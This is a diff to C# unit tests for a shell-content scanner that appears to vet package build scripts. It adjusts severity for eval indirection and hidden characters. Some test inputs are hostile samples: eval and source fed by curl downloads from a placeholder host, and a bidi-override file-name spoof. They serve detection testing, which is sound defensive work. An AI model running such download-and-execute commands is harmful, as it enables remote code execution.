@@ -61,13 +61,56 @@ public class ShellContentScannerTests
         AssertHasFinding(content, "decode-to-shell", FindingSeverity.Critical);
     }
 
-    [TestCase("eval $(cat cmd)")]
-    [TestCase("eval `cat cmd`")]
+    [TestCase("eval $(python -c 'import os')")]
+    [TestCase("eval `ssh host cmd`")]
     [TestCase("eval base64 -d")]
-    [TestCase(". $(cat cmd)", Description = "source builtin with command substitution")]
+    [TestCase(". $(curl http://x/cmd)", Description = "source builtin fed by a download")]
+    [TestCase("eval echo $(curl http://x/cmd)", Description = "echo fed by a download stays critical")]
     public void Eval_indirection_flags_dynamic_command_execution(string content)
     {
         AssertHasFinding(content, "eval-indirection", FindingSeverity.Critical);
+    }
+
+    [TestCase("eval $(opam env)")]
+    [TestCase("eval $(opam env --switch=$pkgname --set-switch)")]
+    [TestCase("eval $(makepkg -g --noprepare -do -p $f)")]
+    [TestCase("eval $(dbus-launch --sh-syntax)")]
+    [TestCase("eval `pifpaf run httpbin --port 64051`")]
+    [TestCase("eval $(perl -V:sitearch)")]
+    [TestCase("eval $(grep -E '^arch=' PKGBUILD)")]
+    [TestCase("eval $(cat /proc/meminfo | awk '/^MemTotal/ {print $2}')")]
+    [TestCase("eval $(./get_latest $archs)")]
+    [TestCase("eval $(\"${ENVY_BIN}\" session)")]
+    [TestCase("eval $(cat cmd)")]
+    [TestCase(". $(cat cmd)", Description = "source builtin with command substitution")]
+    [TestCase("SUDO_HOME=$(eval echo ~$SUDO_USER)", Description = "tilde-of-user idiom")]
+    [TestCase("_last_modified=$(eval echo \\${_last_modified_${CARCH}})", Description = "indirect variable name via eval echo")]
+    [TestCase("eval echo -n `grep -oP 'VERSION' CMakeLists.txt`", Description = "echo of a local parser's output")]
+    public void Eval_indirection_downgrades_established_idioms_to_medium(string content)
+    {
+        AssertHasFinding(content, "eval-indirection", FindingSeverity.Medium);
+    }
+
+    [TestCase("pkgdesc=\"An open source EchoLink proxy for Linux and Windows\"",
+        Description = "'source' is part of English display text")]
+    [TestCase("Description=Open Source EchoLink Proxy",
+        Description = "keyword after a plain word is an argument mention, not a command")]
+    [TestCase("printf \"You need to source $(tput setaf 2)/etc/profile$(tput sgr0) to continue\"",
+        Description = "'source' inside a printf format string is display text")]
+    [TestCase("echo $(grep -oP 'VERSION \\S+' CMakeLists.txt) .r $(git rev-list --count HEAD) . $(git rev-parse --short HEAD)",
+        Description = "standalone '.' separator between echo arguments")]
+    public void Eval_indirection_ignores_display_text_and_argument_mentions(string content)
+    {
+        var findings = Scan(content);
+        Assert.That(findings.Any(f => f.RuleId == "eval-indirection"), Is.False,
+            $"Unexpected eval-indirection finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [Test]
+    public void Eval_indirection_after_control_keyword_stays_flagged()
+    {
+        // 'then' directly precedes an invoked command: this is a real eval in command position.
+        AssertHasFinding("if true; then eval $(python -c 'x'); fi", "eval-indirection", FindingSeverity.Critical);
     }
 
     [TestCase("pkgver=$(date +%s)")]
@@ -170,10 +213,57 @@ public class ShellContentScannerTests
     }
 
     [Test]
-    public void Hidden_character_is_flagged_as_critical()
+    public void Hidden_character_zero_width_is_flagged_as_medium()
     {
-        var findings = Scan("echo rm\u200Brf");
-        Assert.That(findings.Any(f => f is { RuleId: "hidden-character", Severity: FindingSeverity.Critical }), Is.True);
+        // Zero-width chars cannot change shell tokenization, so they are review-only.
+        AssertHasFinding("echo rm\u200Brf", "hidden-character", FindingSeverity.Medium);
+        // 🏋️ = U+1F3CB U+FE0F U+200D U+2642 U+FE0F - the ZWJ joins the emoji sequence.
+        AssertHasFinding("pkgdesc=\"\uD83C\uDFCB\uFE0F\u200D\u2642\uFE0F Training\"", "hidden-character", FindingSeverity.Medium);
+    }
+
+    [Test]
+    public void Hidden_character_bidi_override_stays_critical()
+    {
+        AssertHasFinding("pkgname=evil\u202Esh", "hidden-character", FindingSeverity.Critical);
+    }
+
+    [Test]
+    public void Hidden_character_control_char_outside_quotes_stays_critical()
+    {
+        AssertHasFinding("echo rm\u0001rf", "hidden-character", FindingSeverity.Critical);
+    }
+
+    [Test]
+    public void Ansi_escape_sequences_are_not_hidden_characters()
+    {
+        // Complete CSI sequences are terminal styling - skipped even unquoted.
+        var findings = Scan("echo \u001b[96m${blinking:blink=! blink:1}\r\u001b[0m");
+        Assert.That(findings.Any(f => f.RuleId == "hidden-character"), Is.False,
+            $"Unexpected hidden-character finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [Test]
+    public void Control_char_inside_quoted_display_text_is_not_flagged()
+    {
+        var findings = Scan("printf '%s\\n' \"python-poetry: support for Python packages using \u0016Poetry\"");
+        Assert.That(findings.Any(f => f.RuleId == "hidden-character"), Is.False,
+            $"Unexpected hidden-character finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [Test]
+    public void Mojibake_c1_run_is_not_flagged()
+    {
+        // C1 bytes next to Latin-1 supplement characters are double-encoded UTF-8 file names.
+        var findings = Scan("mv \"${pkgdir}/target/\"{\u00d1\u0082.cfg,\u0442.cfg}");
+        Assert.That(findings.Any(f => f.RuleId == "hidden-character"), Is.False,
+            $"Unexpected hidden-character finding. Got: {string.Join(", ", findings.Select(f => $"{f.RuleId}/{f.Severity}"))}");
+    }
+
+    [Test]
+    public void Bare_escape_stays_critical_even_in_quotes()
+    {
+        // OSC-style escapes (ESC ] … BEL) can spoof the terminal even as echoed data.
+        AssertHasFinding("echo \"\u001b]0;evil title\u0007\"", "hidden-character", FindingSeverity.Critical);
     }
 
     [Test]
